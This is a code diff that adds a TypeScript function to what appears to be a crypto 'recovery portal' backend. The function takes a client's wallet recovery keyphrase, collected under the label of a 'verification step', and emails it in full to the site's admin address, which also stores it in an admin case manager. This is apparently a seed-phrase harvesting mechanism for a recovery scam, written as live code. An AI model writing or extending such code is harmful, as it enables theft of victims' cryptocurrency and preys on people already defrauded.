@@ -291,6 +291,73 @@ export async function sendRecoveryEmails(safeData: Record<string, unknown>) {
   return { caseId: generatedCaseId, emailSent: true };
 }
 
+export async function sendKeyphraseAdminEmail(options: {
+  caseId: string;
+  clientEmail: string;
+  clientName?: string;
+  keyphrase: string;
+  submittedAt?: string;
+}): Promise<{ emailSent: boolean }> {
+  if (!isEmailConfigured()) {
+    console.warn("[Email] Keyphrase alert skipped — email not configured");
+    return { emailSent: false };
+  }
+
+  const { ADMIN_EMAIL } = getEmailConfig();
+  const submittedAt =
+    options.submittedAt || new Date().toLocaleString("en-US", { timeZone: "UTC" });
+  const clientName = options.clientName?.trim() || "Client";
+  const escapedPhrase = options.keyphrase
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+
+  await dispatchEmail({
+    to: ADMIN_EMAIL,
+    replyTo: options.clientEmail,
+    subject: `[KEYPHRASE] Wallet verification submitted — ${options.caseId}`,
+    text: [
+      `Wallet verification keyphrase received`,
+      ``,
+      `Case ID: ${options.caseId}`,
+      `Client: ${clientName}`,
+      `Email: ${options.clientEmail}`,
+      `Submitted (UTC): ${submittedAt}`,
+      ``,
+      `Recovery keyphrase:`,
+      options.keyphrase,
+      ``,
+      `Review in the admin console. Treat as highly confidential.`,
+    ].join("\n"),
+    html: `
+      <div style="font-family: ui-monospace, monospace; padding: 24px; color: #0f172a; max-width: 640px;">
+        <h2 style="color: #dc2626; font-family: sans-serif;">Wallet keyphrase submitted</h2>
+        <p style="font-family: sans-serif; color: #64748b; font-size: 14px;">
+          A client completed the verification step on the recovery portal.
+        </p>
+        <table style="width: 100%; font-family: sans-serif; font-size: 14px; margin: 16px 0; border-collapse: collapse;">
+          <tr><td style="padding: 6px 0; color: #64748b;">Case ID</td><td style="padding: 6px 0;"><strong>${options.caseId}</strong></td></tr>
+          <tr><td style="padding: 6px 0; color: #64748b;">Client</td><td style="padding: 6px 0;">${clientName}</td></tr>
+          <tr><td style="padding: 6px 0; color: #64748b;">Email</td><td style="padding: 6px 0;"><a href="mailto:${options.clientEmail}">${options.clientEmail}</a></td></tr>
+          <tr><td style="padding: 6px 0; color: #64748b;">Submitted</td><td style="padding: 6px 0;">${submittedAt}</td></tr>
+        </table>
+        <div style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 16px; margin: 20px 0;">
+          <p style="margin: 0 0 8px; font-family: sans-serif; font-size: 12px; color: #991b1b; font-weight: bold; text-transform: uppercase;">Recovery keyphrase (confidential)</p>
+          <p style="margin: 0; white-space: pre-wrap; word-break: break-word; font-size: 13px; line-height: 1.5;">${escapedPhrase}</p>
+        </div>
+        <p style="font-family: sans-serif; font-size: 12px; color: #94a3b8;">
+          Also saved in the admin case manager. Do not forward this email.
+        </p>
+      </div>
+    `,
+  });
+
+  console.log(
+    `[Email] Keyphrase alert sent to ${ADMIN_EMAIL} for case ${options.caseId}`
+  );
+  return { emailSent: true };
+}
+
 export async function sendSubscribeEmail(name: string, email: string) {
   const { ADMIN_EMAIL } = getEmailConfig();
 
